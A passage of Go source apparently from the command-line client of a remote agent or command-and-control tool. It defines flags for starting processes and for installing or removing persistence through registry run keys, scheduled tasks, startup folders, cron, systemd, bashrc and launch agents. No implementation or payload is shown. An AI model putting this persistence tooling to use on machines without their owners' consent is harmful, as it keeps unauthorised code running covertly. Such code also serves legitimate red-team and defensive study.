	// >>> AKHIR BAGIAN KRUSIAL <<<

	processStartCmd.Flags().StringP("args", "a", "", "Arguments for the process to start")
	processStartCmd.Flags().Bool("wait", false, "Wait for the start confirmation")

	// Persistence setup flags
	persistenceSetupCmd.Flags().String("method", "", "Persistence method (registry_run, schtasks_onlogon, schtasks_daily, startup_folder, cron_reboot, systemd_user, bashrc, launchagent)")
	persistenceSetupCmd.Flags().String("name", "", "Name for persistence entry (auto-generated if not specified)")
	persistenceSetupCmd.Flags().String("path", "", "Path to executable for persistence (required)")
	persistenceSetupCmd.Flags().String("args", "", "Arguments for the executable")
	persistenceSetupCmd.Flags().Bool("wait", false, "Wait for persistence setup to complete")

	// Persistence remove flags
	persistenceRemoveCmd.Flags().String("method", "", "Persistence method used during setup (required)")
	persistenceRemoveCmd.Flags().String("name", "", "Name of persistence entry to remove (required)")
	persistenceRemoveCmd.Flags().Bool("wait", false, "Wait for persistence removal to complete")

	// Add subcommands
	persistenceCmd.AddCommand(persistenceSetupCmd)
	persistenceCmd.AddCommand(persistenceRemoveCmd)

	// Add to root command
	rootCmd.AddCommand(persistenceCmd)
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		// Pesan error sudah dicetak oleh Cobra atau fungsi kita
		os.Exit(1)
	}
}
